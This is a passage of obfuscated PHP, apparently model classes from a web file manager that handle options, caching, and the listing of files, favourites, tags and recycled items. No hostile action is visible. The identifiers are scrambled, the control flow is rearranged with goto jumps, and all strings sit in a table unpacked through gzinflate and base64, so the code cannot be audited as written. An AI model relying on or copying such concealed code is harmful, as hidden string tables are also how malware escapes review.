$CÚ’ö¥»ˆ[$föŞœê£¥] : !1; } public function findByName($FÍ‰Ûí—Ü¯) { return $this->findByKey($_SERVER[ºÖÙÂŒäÉê‡][28], $FÍ‰Ûí—Ü¯); } protected function resetData($EĞ´Ùİ£Ä›) { $BÓ“Ôã¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EĞ´Ùİ£Ä› = is_array($EĞ´Ùİ£Ä›) ? $EĞ´Ùİ£Ä› : array(); $a»Ì‹ãÚÈÃ = array(); for ($d·¾á¦¦ÓÎ = 0; $d·¾á¦¦ÓÎ < count($EĞ´Ùİ£Ä›); $d·¾á¦¦ÓÎ++) { $a»Ì‹ãÚÈÃ[$BÓ“Ôã¶[369] . $EĞ´Ùİ£Ä›[$d·¾á¦¦ÓÎ][$BÓ“Ôã¶[372]]] = $EĞ´Ùİ£Ä›[$d·¾á¦¦ÓÎ]; } return Model($this->modelType)->set($a»Ì‹ãÚÈÃ, !1, $this->optionType); } private function getAutoName($b„³¨ä¼Ğö) { $FíÂ‹¢…° = array_to_keyvalue($this->listData(), $_SERVER[ºÖÙÂŒäÉê‡][28]); if (!$FíÂ‹¢…° || !isset($FíÂ‹¢…°[$b„³¨ä¼Ğö])) { return $b„³¨ä¼Ğö; } for ($eòå†Ğ£³• = 1; $eòå†Ğ£³• < count($FíÂ‹¢…°); $eòå†Ğ£³•++) { $c»Ş»„Æ¹ = $b„³¨ä¼Ğö . "\50{$eòå†Ğ£³•}\51"; if (!isset($FíÂ‹¢…°[$c»Ş»„Æ¹])) { return $c»Ş»„Æ¹; } } return $c»Ş»„Æ¹; } } goto Eõù½å…³; e‹Ôçğö‚¾: define($_SERVER[ºÖÙÂŒäÉê‡][0], $_SERVER[ºÖÙÂŒäÉê‡][1]); $_SERVER[Ş†Ÿ·Ñ«”ÔÂ] = explode($_SERVER[ºÖÙÂŒäÉê‡][2], gzinflate(substr($_SERVER[ºÖÙÂŒäÉê‡][3], 10, -8))); function Model($f¤¹‚„Àª = '', $f¬‰¹ô¾¦ = '', $F®³†£è’­ = '') { goto cë Øâ¾±Æ; a¹ÒÛ‰÷Ì: if (isset($F‚®…Š…æÄ[$dÑ½Éô°¡Ø])) { return $F‚®…Š…æÄ[$dÑ½Éô°¡Ø]; } if ($f¤¹‚„Àª) { $f¤¹‚„Àª = strtoupper($f¤¹‚„Àª[0]) . substr($f¤¹‚„Àª, 1); $c×›‹àÕî­ = $f¤¹‚„Àª . $açÛ¸ØÙñ[1]; if (class_exists($c×›‹àÕî­)) { $F‚®…Š…æÄ[$dÑ½Éô°¡Ø] = new $c×›‹àÕî­(); return $F‚®…Š…æÄ[$dÑ½Éô°¡Ø]; } } if (!$F®³†£è’­) { $F®³†£è’­ = $GLOBALS[$açÛ¸ØÙñ[2]][$açÛ¸ØÙñ[3]]; } goto dñæ£¸ôÇà; cë Øâ¾±Æ: $açÛ¸ØÙñ =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; static $F‚®…Š…æÄ = array(); $dÑ½Éô°¡Ø = strtolower($f¬‰¹ô¾¦ . $açÛ¸ØÙñ[0] . $f¤¹‚„Àª); goto a¹ÒÛ‰÷Ì; dñæ£¸ôÇà: $F‚®…Š…æÄ[$dÑ½Éô°¡Ø] = new ModelBase($f¤¹‚„Àª, $f¬‰¹ô¾¦, $F®³†£è’­); return $F‚®…Š…æÄ[$dÑ½Éô°¡Ø]; goto C”ñïŸ™ùó; C”ñïŸ™ùó: } goto BÍ©‡Ë©Ì˜; D¸ö¢³¿ã¦: function beforeShutdownError($DÊÇ¹ï‚àŠ = false, $E›ˆ¨ªŒ‰ = '', $c…„èÁŸ§ = '', $d‰ÛÑøò‚‡ = 0) { $EÆØ“èèìæ =& $_SERVER[Ş†Ÿ·Ñ«”ÔÂ]; switch ($DÊÇ¹ï‚àŠ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $A˜îßä“Ñí = $EÆØ“èèìæ[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $A˜îßä“Ñí = $EÆØ“èèìæ[40]; break; case E_STRICT: $A˜îßä“Ñí = $EÆØ“èèìæ[41]; break; case E_NOTICE: case E_USER_NOTICE: $A˜îßä“Ñí = $EÆØ“èèìæ[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $A˜îßä“Ñí = $EÆØ“èèìæ[43]; break; default: break; } if (!$A˜îßä“Ñí || $A˜îßä“Ñí == $EÆØ“èèìæ[42] || $A˜îßä“Ñí == $EÆØ“èèìæ[43]) { return; } $c…„èÁŸ§ = $EÆØ“èèìæ[4] . str_replace($_SERVER[$EÆØ“èèìæ[37]], $EÆØ“èèìæ[20], $c…„èÁŸ§); $dÎ‰Ğæî‘í = $A˜îßä“Ñí . $EÆØ“èèìæ[44] . $E›ˆ¨ªŒ‰ . $EÆØ“èèìæ[44] . $c…„èÁŸ§ . $EÆØ“èèìæ[44] . $d‰ÛÑøò‚‡; write_log($dÎ‰Ğæî‘í . $EÆØ“èèìæ[18] . get_caller_msg(1), $EÆØ“èèìæ[19]); } $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][45]] = $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][37]] . $_SERVER[Ş†Ÿ·Ñ«”ÔÂ][46]; $fš´æ›ïñ´ = strrev(base64_decode($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][47])); goto cÑ’ãã…‹§; Eõù½å…³: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($E“¸Œ¥Ûá³ = false, $D±Åà¥Ø“ = '', $FµØÍ÷¼î = false) { goto BíÎê¸­²—; aŠÙÜ†¹Ää: $fÉŸÔä‚Ş = is_array($fÉŸÔä‚Ş) ? $fÉŸÔä‚Ş : array(); if (is_array($B õ£ÑËª)) { $B õ£ÑËª = array_merge($fÉŸÔä‚Ş, $B õ£ÑËª); return $E“¸Œ¥Ûá³ ? isset($B õ£ÑËª[$E“¸Œ¥Ûá³]) ? $B õ£ÑËª[$E“¸Œ¥Ûá³] : null : $B õ£ÑËª; } $fˆĞë„×Öğ = $this->filterWhere(array($C¬ïÊäà¬[29] => $D±Åà¥Ø“)); goto B÷„¨õÈ‚; BíÎê¸­²—: $C¬ïÊäà¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B õ£ÑËª = $this->cacheGet($D±Åà¥Ø“); $fÉŸÔä‚Ş = $this->optionDefault($D±Åà¥Ø“); goto aŠÙÜ†¹Ää; B÷„¨õÈ‚: $B õ£ÑËª = $this->where($fˆĞë„×Öğ)->select(); $B õ£ÑËª = array_to_keyvalue($B õ£ÑËª, $C¬ïÊäà¬[89], $C¬ïÊäà¬[364]); foreach ($B õ£ÑËª as $fé×ã³îˆ => $bŒ¢°“’ÏÑ) { if ($FµØÍ÷¼î || in_array($fé×ã³îˆ, $this->jsonField)) { $B õ£ÑËª[$fé×ã³îˆ] = json_decode($bŒ¢°“’ÏÑ, !0); } } goto CÚâĞÅ®; CÚâĞÅ®: $this->cacheSet($D±Åà¥Ø“, $B õ£ÑËª); $B õ£ÑËª = array_merge($fÉŸÔä‚Ş, $B õ£ÑËª); return $E“¸Œ¥Ûá³ ? $B õ£ÑËª[$E“¸Œ¥Ûá³] : $B õ£ÑËª; goto f‘ÅĞ·‘ê¨; f‘ÅĞ·‘ê¨: } public function set($eôÆ…ĞŒ÷ô, $cÆÈ§ÇÂê¹ = false, $a‹è…÷®…– = '') { goto BÌ§Œ—³ ; BÌ§Œ—³ : $d†Éö‚øíä =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->cacheRemove($a‹è…÷®…–); $dê©×ùÚã = array(); goto d÷Ş×†–³; C¿á‘É®ŒĞ: return $this->addAll($dê©×ùÚã, array(), !0); goto dÑ¨•‚Šóß; d÷Ş×†–³: $eÆãô¹‘× = is_array($eôÆ…ĞŒ÷ô) ? $eôÆ…ĞŒ÷ô : array($eôÆ…ĞŒ÷ô => $cÆÈ§ÇÂê¹); foreach ($eÆãô¹‘× as $c²ç¨¬ÕßÛ => $Fºö”²µò) { if (is_array($Fºö”²µò)) { $Fºö”²µò = json_encode_force($Fºö”²µò); } $this->checkLength($Fºö”²µò, !1, $this->tableName . $d†Éö‚øíä[4] . $eôÆ…ĞŒ÷ô); $Fºö”²µò = self::textEncode($Fºö”²µò); $eÆãô¹‘× = array($d†Éö‚øíä[29] => $a‹è…÷®…–, $d†Éö‚øíä[89] => $c²ç¨¬ÕßÛ, $d†Éö‚øíä[364] => $Fºö”²µò); $dê©×ùÚã[] = $this->filterWhere($eÆãô¹‘×); } if (!$dê©×ùÚã) { return !0; } goto C¿á‘É®ŒĞ; dÑ¨•‚Šóß: } protected function optionDefault($a½­ù„Ö·ğ = '') { return !1; } public function setDeep($DŒŞ£¡Øï¤, $cÒ¤µ‰²Û™ = false, $E´’÷É¯ù = '') { $f©æ±¼†³ = explode($_SERVER[ºÖÙÂŒäÉê‡][91], $DŒŞ£¡Øï¤); $F„ù›Êùƒø = $this->get(); array_set_value($F„ù›Êùƒø, $DŒŞ£¡Øï¤, $cÒ¤µ‰²Û™); $this->set($f©æ±¼†³[0], $F„ù›Êùƒø[$f©æ±¼†³[0]], $E´’÷É¯ù); } public function remove($fĞäóŸˆ½×, $b¨ÇÕË±¨ = '') { $f¸½„Ù‹İš =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->cacheRemove($b¨ÇÕË±¨); $d¶¯„´Ú¡„ = $this->filterWhere(array($f¸½„Ù‹İš[89] => $fĞäóŸˆ½×, $f¸½„Ù‹İš[29] => $b¨ÇÕË±¨)); if (is_null($fĞäóŸˆ½×)) { unset($d¶¯„´Ú¡„[$f¸½„Ù‹İš[89]]); } return $this->where($d¶¯„´Ú¡„)->delete(); } public function cacheSet($EİèÀ…İ°·, $A‡¾ù¡ºù = false) { return Cache::set($this->cacheKey($EİèÀ…İ°·), $A‡¾ù¡ºù); } public function cacheGet($a»¦È‚Œö) { return Cache::get($this->cacheKey($a»¦È‚Œö)); } public function cacheRemove($f–Ï²Š˜‡) { return Cache::remove($this->cacheKey($f–Ï²Š˜‡)); } protected function filterWhere($D½®µØ²¹) { return $D½®µØ²¹; } protected function cacheKey($A‹„ƒÀ„î·) { return $A‹„ƒÀ„î·; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\x72\x63\145"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\145" => "\151\157\x5f\x73\157\165\x72\x63\145\x5f\155\x65\x74\141", "\155\x65\x74\x61\x46\151\x65\x6c\144" => "\163\157\x75\162\x63\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\151\155\x65", "\x74\x69\155\x65", "\x69\x6e\x73\x65\x72\164", "\x66\x75\156\143\164\x69\157\x6e"), array("\x63\162\x65\141\x74\145\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\162\164", "\x66\165\x6e\143\x74\151\157\156"), array("\x76\151\145\167\x54\x69\155\145", "\164\x69\155\x65", "\x69\x6e\163\145\162\164", "\146\x75\x6e\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CÎœö­ˆ—‚) { return $this->listSource(array($_SERVER[ºÖÙÂŒäÉê‡][373] => $CÎœö­ˆ—‚)); } public function typeName($DË¾©Ô‘—¾) { static $eÎÕ½¨À•Ô = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $eÎÕ½¨À•Ô[$DË¾©Ô‘—¾ . $_SERVER[ºÖÙÂŒäÉê‡][33]]; } public function sourceListInfo($dË„ Äßô˜, $AÈÙ¢è„© = false) { goto BÓÔ¯´; cÕÑË›ã Ñ: return array_to_keyvalue($e®Ê—Ñ„£÷, $b¸±Òµ ŒÁ[374]); goto bùµÁ‰Ú; f¬ÔªŞÜÂ: if (!$dË„ Äßô˜) { return array(); } $e®Ê—Ñ„£÷ = $this->where(array($b¸±Òµ ŒÁ[374] => array($b¸±Òµ ŒÁ[7], $dË„ Äßô˜)))->select(); $this->_listDataApply($e®Ê—Ñ„£÷, $AÈÙ¢è„©); goto cÕÑË›ã Ñ; BÓÔ¯´: $b¸±Òµ ŒÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dË„ Äßô˜ = $dË„ Äßô˜ ? $dË„ Äßô˜ : array(); $dË„ Äßô˜ = array_filter(array_unique($dË„ Äßô˜)); goto f¬ÔªŞÜÂ; bùµÁ‰Ú: } public function pathInfoFilter($f“‰…—ÑÀÉ) { goto FÕÀêÒëĞò; fæŒÏœõêŸ: $C”—è‰¢¬Í .= $AÊ¸ó¤¶Ğ­[379]; $C”—è‰¢¬Í .= $AÊ¸ó¤¶Ğ­[380]; $a¬†òøÒŸ¯ = explode($AÊ¸ó¤¶Ğ­[47], $C”—è‰¢¬Í); goto DÌ×½Âæ¯; FÕÀêÒëĞò: $AÊ¸ó¤¶Ğ­ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[75]] = KodIO::make($f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[374]]); $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[29]] = $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[375]] == 1 ? $AÊ¸ó¤¶Ğ­[76] : $AÊ¸ó¤¶Ğ­[163]; goto B™Œ£«Ç–Ó; B™Œ£«Ç–Ó: $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[376]] = $this->typeName($f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[376]]); if ($f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[375]] != 1) { $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[156]] = $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[377]]; unset($f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[377]]); } $C”—è‰¢¬Í = $AÊ¸ó¤¶Ğ­[378]; goto fæŒÏœõêŸ; DÌ×½Âæ¯: if (isset($f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[381]]) && $f“‰…—ÑÀÉ[$AÊ¸ó¤¶Ğ­[381]][$AÊ¸ó¤¶Ğ­[382]] == -1) { $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[193]); $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[106]); $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[383]); $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[384]); $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[77]); $a¬†òøÒŸ¯ = array_remove_value($a¬†òøÒŸ¯, $AÊ¸ó¤¶Ğ­[385]); } $f“‰…—ÑÀÉ = array_field_key($f“‰…—ÑÀÉ, $a¬†òøÒŸ¯); return $f“‰…—ÑÀÉ; goto dõªÙ²­¬; dõªÙ²­¬: } public function listUserFav() { goto EÌÇ‰µ¼ø„; Dãô‚£â©: $dÈµĞ“øª = array_to_keyvalue($dÈµĞ“øª, $aÜŒ Ë Àì[33], $aÜŒ Ë Àì[75]); if ($dÈµĞ“øª) { $BŸ«’„ŠËö = $this->listSource(array($aÜŒ Ë Àì[388] => array($aÜŒ Ë Àì[389], $dÈµĞ“øª))); } $BŸ«’„ŠËö = array_to_keyvalue($BŸ«’„ŠËö[$aÜŒ Ë Àì[359]], $aÜŒ Ë Àì[374]); goto e†ìíãå; EÌÇ‰µ¼ø„: $aÜŒ Ë Àì =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÛÛ•ùÏ‰Ë = Model($aÜŒ Ë Àì[386])->listData(); $dÈµĞ“øª = array_filter_by_field($bÛÛ•ùÏ‰Ë, $aÜŒ Ë Àì[29], $aÜŒ Ë Àì[387]); goto Dãô‚£â©; e†ìíãå: foreach ($bÛÛ•ùÏ‰Ë as &$EêèÂİ¬Ãß) { $EêèÂİ¬Ãß = array($aÜŒ Ë Àì[390] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[372]], $aÜŒ Ë Àì[391] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[28]], $aÜŒ Ë Àì[392] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[75]], $aÜŒ Ë Àì[393] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[29]], $aÜŒ Ë Àì[394] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[193]], $aÜŒ Ë Àì[395] => $EêèÂİ¬Ãß[$aÜŒ Ë Àì[106]]); if ($EêèÂİ¬Ãß[$aÜŒ Ë Àì[29]] == $aÜŒ Ë Àì[387] && $BŸ«’„ŠËö[$EêèÂİ¬Ãß[$aÜŒ Ë Àì[75]]]) { $EêèÂİ¬Ãß[$aÜŒ Ë Àì[396]] = $BŸ«’„ŠËö[$EêèÂİ¬Ãß[$aÜŒ Ë Àì[75]]]; } } return $bÛÛ•ùÏ‰Ë; goto f†¥¸ÌŠŒˆ; f†¥¸ÌŠŒˆ: } public function listUserTag($DÂÜ‘…¤…Ÿ) { goto f¶„‚‘õ§¤; A¹Æ×½ƒ˜ì: $Bæ÷ôÖğîâ = array_to_keyvalue($Bæ÷ôÖğîâ, $d›‡Â‰Ôš[33], $d›‡Â‰Ôš[75]); if (!$Bæ÷ôÖğîâ) { return array(); } $FÇ–®¾ä À = array($d›‡Â‰Ôš[388] => array($d›‡Â‰Ôš[389], $Bæ÷ôÖğîâ)); goto E©ØÛø¥áÇ; f¶„‚‘õ§¤: $d›‡Â‰Ôš =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÍŠÒäÔ¤Ã = Model($d›‡Â‰Ôš[397])->listData(); $Bæ÷ôÖğîâ = array_filter_by_field($dÍŠÒäÔ¤Ã, $d›‡Â‰Ôš[398], $DÂÜ‘…¤…Ÿ); goto A¹Æ×½ƒ˜ì; E©ØÛø¥áÇ: return $this->listSource($FÇ–®¾ä À); goto B¦Ğ†®Ó³›; B¦Ğ†®Ó³›: } public function listUserRecycle() { $aùâ†÷¸ê =& $_SERVER[ºÖÙÂŒäÉê‡]; $BŞóİ¿÷é = Model($aùâ†÷¸ê[399])->listData(); if (!$BŞóİ¿÷é) { return array(); } $DäĞæ³‰³™ = array($aùâ†÷¸ê[388] => array($aùâ†÷¸ê[389], $BŞóİ¿÷é), $aùâ†÷¸ê[400] => 1); return $this->listSource($DäĞæ³‰³™); } public function listSource($Cºğ”ÙÁÒ, $EÙæå£¿Á— = 3000) { goto A°Èç¼å´Ì; cÆµ±¼¬ªÃ: $dÏ¡Â„˜õ = $this->field($EöõãÁìáÉ)->_makeOrder()->where($Cºğ”ÙÁÒ)->selectPage($EÙæå£¿Á—); $this->_listDataApply($dÏ¡Â„˜õ[$Ağ¬ƒŒ×ãá[359]]); $this->_listMake($dÏ¡Â„˜õ); goto FŒÏÙîÖ; FŒÏÙîÖ: return $dÏ¡Â„˜õ; goto E§„ÒˆÌÖ; A°Èç¼å´Ì: $Ağ¬ƒŒ×ãá =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($Cºğ”ÙÁÒ[$Ağ¬ƒŒ×ãá[401]])) { $Cºğ”ÙÁÒ[$Ağ¬ƒŒ×ãá[401]] = 0; } $EöõãÁìáÉ = $Ağ¬ƒŒ×ãá[402]; goto cÆµ±¼¬ªÃ; E§„ÒˆÌÖ: } protected function _makeOrder() { goto F¦”÷‡âÉ; F¦”÷‡âÉ: $fç‘„ï¹ì° =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÜà©•Çœ— = Model($fç‘„ï¹ì°[403])->get($fç‘„ï¹ì°[404]); $FØ­ÇÌÇ = Model($fç‘„ï¹ì°[403])->get($fç‘„ï¹ì°[405]); goto F¿Ö¥ŸçÅ¦; dµİóºñ¶‡: if ($B‹Úµäš“ƒ == $fç‘„ï¹ì°[28]) { } $B¢Ô„ˆøßŸ = $fç‘„ï¹ì°[413] . $dÕ¿¸äê–¹[$B‹Úµäš“ƒ] . $fç‘„ï¹ì°[50] . $f²ñ¯ğàœ[$A‘è¾’”¾Ş]; return $this->order(rtrim(trim($B¢Ô„ˆøßŸ), $fç‘„ï¹ì°[47])); goto Fê‚Ú•½Äâ; d¹î®»æ¹¸: $A‘è¾’”¾Ş = Input::get($fç‘„ï¹ì°[412], $fç‘„ï¹ì°[7], $FØ­ÇÌÇ, array_keys($f²ñ¯ğàœ)); if (!in_array($B‹Úµäš“ƒ, array_keys($dÕ¿¸äê–¹))) { $B‹Úµäš“ƒ = $fç‘„ï¹ì°[28]; } if (!in_array($A‘è¾’”¾Ş, array_keys($f²ñ¯ğàœ))) { $B‹Úµäš“ƒ = $fç‘„ï¹ì°[406]; } goto dµİóºñ¶‡; F¿Ö¥ŸçÅ¦: $f²ñ¯ğàœ = array($fç‘„ï¹ì°[406] => $fç‘„ï¹ì°[407], $fç‘„ï¹ì°[408] => $fç‘„ï¹ì°[409]); $dÕ¿¸äê–¹ = array($fç‘„ï¹ì°[28] => $fç‘„ï¹ì°[28], $fç‘„ï¹ì°[77] => $fç‘„ï¹ì°[77], $fç‘„ï¹ì°[156] => $fç‘„ï¹ì°[377], $fç‘„ï¹ì°[383] => $fç‘„ï¹ì°[383], $fç‘„ï¹ì°[410] => $fç‘„ï¹ì°[384], $fç‘„ï¹ì°[193] => $fç‘„ï¹ì°[193], $fç‘„ï¹ì°[106] => $fç‘„ï¹ì°[106]); $B‹Úµäš“ƒ = Input::get($fç‘„ï¹ì°[411], $fç‘„ï¹ì°[7], $DÜà©•Çœ—, array_keys($dÕ¿¸äê–¹)); goto d¹î®»æ¹¸; Fê‚Ú•½Äâ: } protected function _listDataApplyItem($E¸¾ŸÇÕáˆ, $dğ¡‰á¹×ë = false) { $bê¼˜•Å = array($E¸¾ŸÇÕáˆ); $this->_listDataApply($bê¼˜•Å, $dğ¡‰á¹×ë); return $bê¼˜•Å[0]; } protected function _listDataApply(&$cÊ†Ìç—, $fÒ±Œ‡×‡ = false) { goto a‹½›–‹õÅ; a‹½›–‹õÅ: $dÉ»¬¨Ñã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$cÊ†Ìç—) { $cÊ†Ìç— = array(); return; } $eá‹º÷„Ûˆ = array_to_keyvalue($cÊ†Ìç—, $dÉ»¬¨Ñã[33], $dÉ»¬¨Ñã[374]); goto aİ¨™¬åõ‰; aİ¨™¬åõ‰: $eá‹º÷„Ûˆ = array_unique($eá‹º÷„Ûˆ); $this->_listSourceCache($cÊ†Ìç—); if (!$fÒ±Œ‡×‡) { $this->_listAppendMeta($cÊ†Ìç—, $eá‹º÷„Ûˆ); $this->_listAppendFileMeta($cÊ†Ìç—, $eá‹º÷„Ûˆ); $this->_listAppendChildren($cÊ†Ìç—, $eá‹º÷„Ûˆ); } goto eÍŒååˆÍ‚; eÍŒååˆÍ‚: $this->_listAppendPath($cÊ†Ìç—); $this->_listAppendAuth($cÊ†Ìç—); $this->_listAppendSourceInfo($cÊ†Ìç—, $eá‹º÷„Ûˆ); goto E ˆ¹³×àÙ; E ˆ¹³×àÙ: $this->_listAppendUser($cÊ†Ìç—); $this->_listFilterInfo($cÊ†Ìç—, $fÒ±Œ‡×‡); goto BÀšªî¡Æ×; BÀšªî¡Æ×: } protected function _listSourceCache($AÃµÚÌ©õí) { $fÄ¸Ä…–â° =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($AÃµÚÌ©õí as $E‚›¯†ª±) { self::$cacheSourceInfo[$fÄ¸Ä…–â°[414] . $E‚›¯†ª±[$fÄ¸Ä…–â°[374]]] = $E‚›¯†ª±; } } protected function _listFilterInfo(&$eàñ®‚Ô, $DóÇİ¨êí = false) { $Bè×Ïª§Ÿ¹ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($eàñ®‚Ô as &$Cˆ×¾…Õ…) { $Cˆ×¾…Õ… = $this->pathInfoFilter($Cˆ×¾…Õ…); self::$cachePathInfo[$Bè×Ïª§Ÿ¹[415] . intval($DóÇİ¨êí) . $Bè×Ïª§Ÿ¹[416] . $Cˆ×¾…Õ…[$Bè×Ïª§Ÿ¹[374]]] = $Cˆ×¾…Õ…; } } protected function _listMake(&$f¬ˆ½›©‘) { $B“’â­ò›š =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¬ˆ½›©‘[$B“’â­ò›š[74]] = array(); $f¬ˆ½›©‘[$B“’â­ò›š[73]] = array(); foreach ($f¬ˆ½›©‘[$B“’â­ò›š[359]] as $bÜÃä°ôÅ) { $C³è¡„ôÅ = $bÜÃä°ôÅ[$B“’â­ò›š[375]] == 1 ? $B“’â­ò›š[74] : $B“’â­ò›š[73]; $f¬ˆ½›©‘[$C³è¡„ôÅ][] = $bÜÃä°ôÅ; } unset($f¬ˆ½›©‘[$B“’â­ò›š[359]]); } protected function _listAppendMeta(&$DÖçÖÖÃ‘, $câîÖ—ÑñÑ) { goto AğÉé²¦Ÿ›; D³Â¢äš»Å: if (!$dÑ½ˆ†·íß) { return; } $eÃÕôâÚÌÍ = array($EÖ“Ê–«[419], $EÖ“Ê–«[420]); $BìâİÇŞ…õ = array(); goto F³ÈÂù°šÒ; AğÉé²¦Ÿ›: $EÖ“Ê–« =& $_SERVER[ºÖÙÂŒäÉê‡]; $A¾Õéø½¸ = array($EÖ“Ê–«[388] => array($EÖ“Ê–«[389], $câîÖ—ÑñÑ)); $dÑ½ˆ†·íß = Model($EÖ“Ê–«[417])->field($EÖ“Ê–«[418])->where($A¾Õéø½¸)->select(); goto D³Â¢äš»Å; F³ÈÂù°šÒ: foreach ($dÑ½ˆ†·íß as $BŠ¹à¼‡®Ü) { if (!isset($BìâİÇŞ…õ[$BŠ¹à¼‡®Ü[$EÖ“Ê–«[374]]])) { $BìâİÇŞ…õ[$BŠ¹à¼‡®Ü[$EÖ“Ê–«[374]]] = array(); } if (in_array($BŠ¹à¼‡®Ü[$EÖ“Ê–«[89]], $eÃÕôâÚÌÍ)) { continue; } $BìâİÇŞ…õ[$BŠ¹à¼‡®Ü[$EÖ“Ê–«[374]]][$BŠ¹à¼‡®Ü[$EÖ“Ê–«[89]]] = $BŠ¹à¼‡®Ü[$EÖ“Ê–«[364]]; } foreach ($DÖçÖÖÃ‘ as &$Dë‘Ğä²¹ç) { $Dë‘Ğä²¹ç[$EÖ“Ê–«[421]] = !1; if (isset($BìâİÇŞ…õ[$Dë‘Ğä²¹ç[$EÖ“Ê–«[374]]])) { $Dë‘Ğä²¹ç[$EÖ“Ê–«[421]] = $BìâİÇŞ…õ[$Dë‘Ğä²¹ç[$EÖ“Ê–«[374]]]; } if ($this->fileIsLock($Dë‘Ğä²¹ç) && $Dë‘Ğä²¹ç[$EÖ“Ê–«[381]]) { $DæªÄÓÑ”Ç = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Dë‘Ğä²¹ç[$EÖ“Ê–«[381]][$EÖ“Ê–«[382]] = AuthModel::authDisable($Dë‘Ğä²¹ç[$EÖ“Ê–«[381]][$EÖ“Ê–«[382]], $DæªÄÓÑ”Ç); $Dë‘Ğä²¹ç[$EÖ“Ê–«[381]][$EÖ“Ê–«[422]][$EÖ“Ê–«[381]] = $Dë‘Ğä²¹ç[$EÖ“Ê–«[381]][$EÖ“Ê–«[382]]; } } goto f¦½ªßÌ; f¦½ªßÌ: } protected function _listAppendFileMeta(&$c’ßî—­¹, $bŒÏŠØ‹»Ú) { goto cÚŒ÷³„Â‘; bàá”´Ê¢©: $Cİİ†×ÙÆ = Model($bøÀ‹ŠÙÑá[426])->field($EŒé¸ÅÑ™‘)->where($E´³Ôáƒ‘´)->select(); $Cİİ†×ÙÆ = array_to_keyvalue($Cİİ†×ÙÆ, $bøÀ‹ŠÙÑá[423]); $cÊ·Î¾ˆÔí = Model($bøÀ‹ŠÙÑá[427])->field($bøÀ‹ŠÙÑá[428])->where($E´³Ôáƒ‘´)->select(); goto D†„¢ì½Ğï; fÑÔ–šÙ¢Ç: if (!$CÒ·—‹ˆÖÆ) { return; } $E´³Ôáƒ‘´ = array($bøÀ‹ŠÙÑá[424] => array($bøÀ‹ŠÙÑá[389], $CÒ·—‹ˆÖÆ)); $EŒé¸ÅÑ™‘ = $bøÀ‹ŠÙÑá[425]; goto bàá”´Ê¢©; e™‘ËŠ˜Ã†: foreach ($c’ßî—­¹ as &$eæ¼¡íãÁ) { goto CöÃÁ³È¤„; eè„˜˜Ÿ¦: if (isset($eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[158]][$bøÀ‹ŠÙÑá[430]])) { $eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[430]] = json_decode($eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[158]][$bøÀ‹ŠÙÑá[430]], !0); unset($eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[158]][$bøÀ‹ŠÙÑá[430]]); } goto dÕÄâ¿Ã¸Û; CöÃÁ³È¤„: $c×‡¼æãõÅ = $eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[423]]; if (!$c×‡¼æãõÅ || !isset($Cİİ†×ÙÆ[$c×‡¼æãõÅ])) { continue; } 